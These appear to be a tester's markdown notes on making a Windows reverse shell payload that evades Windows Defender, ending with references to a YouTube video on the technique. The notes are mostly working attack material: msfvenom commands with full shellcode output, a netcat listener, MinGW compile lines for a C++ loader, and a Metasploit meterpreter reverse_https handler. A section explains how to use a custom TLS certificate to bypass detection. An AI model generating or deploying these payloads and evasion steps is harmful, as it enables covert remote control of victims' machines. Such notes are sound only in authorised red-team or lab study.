- [Generate TCP Reverse Shell](#generate-tcp-reverse-shell)
- [Compile C++ Code in Kali](#compile-c-code-in-kali)
- [References](#references)

-------------------------------------------


## [Generate TCP Reverse Shell](#generate-tcp-reverse-shell)
```sh
msfvenom -p windows/x64/shell_reverse_tcp lhost=$myip lport=1337 -f c
msfvenom -p windows/x64/shell_reverse_tcp lhost=$myip lport=1337 -f raw -o beacon.bin
```

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=$myip lport=1337 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of c file: 1963 bytes
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x05\x39\x0a\x01\x01\x0a"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
```

Paste the byte array to the source code

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=$myip lport=1337 -f raw -o beacon.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: beacon.bin
```

## Run listener on port 1337
```sh
nc -nlvvp 8443
```

## [Compile C++ Code in Kali](#compile-c-code-in-kali)
```sh
x86_64-w64-mingw32-gcc template.cpp -o 6-updated-code.exe -fpermissive -lws2_32
x86_64-w64-mingw32-gcc template.cpp -fpermissive -lws2_32 -o 7-updated-code.exe
```

## [Non Malicious Payload]
```sh
unsigned char payload[] ="\x00\x00\x00\x00";
```

## 
```sh

```

## [msfconsole meterpreter]
```sh
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
options
set lhost eth1
advanced
```

## 
```sh
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > set lhost eth1
lhost => 10.1.1.10

msf6 exploit(multi/handler) > grep -i ssl advanced
   HandlerSSLCert                                                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   SSLVersion                   Auto                                             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Ac
                                                                                           cepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   StagerVerifySSLCert          false                                            no        Whether to verify the SSL certificate in Meterpreter
msf6 exploit(multi/handler) >
```

## [Custom SSL/TLS Certificate for Meterpreter/Metasploit]
For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command:
```sh
$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt
```

## 
```sh
$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt
...+..+.+..+.............+..+....+...+.....+.+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*......+...+.....+.+.....+...+............+.+...+..+.......+.....+...+.......+...+.....+...+......+..........+.........+..+...+.+........+.............+...+.....+......+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*................+..+......+.......+..+...+....+...........+...+.+...+...............+..+....+.........+...........+................+...............+.....+.+.................+.............+...+.........+...+...........................+...+..+.+.........+............+.....+.+............+.....................+..............+.+......+.....+....+......+...........+...+.........+.+......+......+...............+..+...+.........+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
....+.+........+............+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+...+..+.......+...............+..+.+...+..+..........+.................+.+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+.....+....+..................+...+........+....+..+.+...+.........+............+.........+..+.........+...+.......+........+..................+.........+......+...+....+..+...............+....+.....+....+...+.................+.............+.........+..............+.......+..................+...............+......+......+..+...+.......+...+..+...........................+.+.....+.......+..+......+.......+.....+.+......+........+...+...+..........+..+.....................................+..+.+.....+..........+..............+.+..+...+.......+.....+...+..........+..+......+...............+.+......+...+..+...+.........+...+..........+............+...+.....+............+................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----

$ l www.example.com.pem   
-rw-r--r-- 1 kali kali 5.2K Nov 29 12:09 www.example.com.pem

$ f www.example.com.pem
www.example.com.pem: ASCII text
```

## Use our own self created certificate instead of Metasploit to bypass detection
```sh
msf6 exploit(multi/handler) > set HandlerSSLCert www.example.com.pem
HandlerSSLCert => www.example.com.pem
```

## 
```sh
msf6 exploit(multi/handler) > grep -i ssl advanced
   HandlerSSLCert               www.example.com.pem                              no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   SSLVersion                   Auto                                             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Ac
                                                                                           cepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   StagerVerifySSLCert          false                                            no        Whether to verify the SSL certificate in Meterpreter
msf6 exploit(multi/handler) >
```

## 
```sh
msf6 exploit(multi/handler) > set StagerVerifySSLCert true 
StagerVerifySSLCert => true
```

## 
```sh
msf6 exploit(multi/handler) > grep -i ssl advanced
   HandlerSSLCert               www.example.com.pem                 no        Path to a SSL certificate in unified PEM format, ignored for
   SSLVersion                   Auto                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL2
                                                                              3 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1
   StagerVerifySSLCert          true                                no        Whether to verify the SSL certificate in Meterpreter
msf6 exploit(multi/handler) >
```

## 
```sh
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=$myip lport=4444 HandlerSSLCert=www.example.com.pem StagerVerifySSLCert=true -f raw -o beacon2.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 664 bytes
Saved as: beacon2.bin

$ l beacon*    
-rw-r--r-- 1 kali kali 664 Nov 29 12:27 beacon2.bin
-rw-r--r-- 1 kali kali 460 Nov 29 11:51 beacon.bin
```

## 
```sh
msf6 exploit(multi/handler) > options                                                                                                                                              
                                                                                                                                                                                   
Module options (exploit/multi/handler):                                                                                                                                            
                                                                                                                                                                                   
   Name  Current Setting  Required  Description                                                                                                                                    
   ----  ---------------  --------  -----------                                                                                                                                    
                                                                                                                                                                                   

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.1.10        yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run 

[*] Started HTTPS reverse handler on https://10.1.1.10:8443
```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

# [References](#references-1)

How to bypass Windows Defender with Custom C++ .EXE Payload Loader (Meterpreter Reverse Shell)
https://www.youtube.com/watch?v=4ntO_9kk23E

Gemini Cyber Security
2.71K subscribers

8,614 views  May 14, 2023  Windows Malware Payload Generation and Bypass
Be better than yesterday - 

This video showcases how it was possible to modify several publicly available source code and customise a template .EXE payload loader file that will fetch a Meterpreter payload from a remote HTTP server and subsequently, performs a process injection technique which ultimately bypasses Windows Defender. This allowed a fully functional Meterpreter reverse shell on a victim's Windows machine.

The video provides a step-by-step walkthrough guide and a practical demonstration on how you can generate a .EXE payload loader file in C++ that will achieve a Meterpreter reverse shell with custom SSL/TLS Certificate on a Windows machine that has Windows Defender running.

DISCLAIMER:
All content posted on this Youtube channel is SOLELY FOR Educational and Awareness purposes ONLY. Any actions and/or activities related to the material presented in this Youtube channel is entirely YOUR responsibility. 

We DO NOT promote, support, encourage any illegal activities such as hacking, and we WILL NOT BE HELD responsible in the event of any misuse and abuse of the content resulting in any criminal charges. 

Stay connected:
Twitter:   / gemini_security  
Udemy: https://www.udemy.com/user/gemini-88/
Github: https://github.com/gemini-security
Discord:   / discord  

Looking to donate?
BTC: 19HiqQ2Qw83mxK9dcdoWb8VfAcsNgmp52k

Buy me a coffee!
https://www.buymeacoffee.com/gemini.c...

Github repository reference:
https://github.com/TheD1rkMtr/Shellcode-Hide

Custom SSL/TLS Certificate for Meterpreter/Metasploit:
https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html

Gemini Security Awesome Hacking T-Shirts - Support the channel:
https://www.redbubble.com/people/GeminiSecurity/shop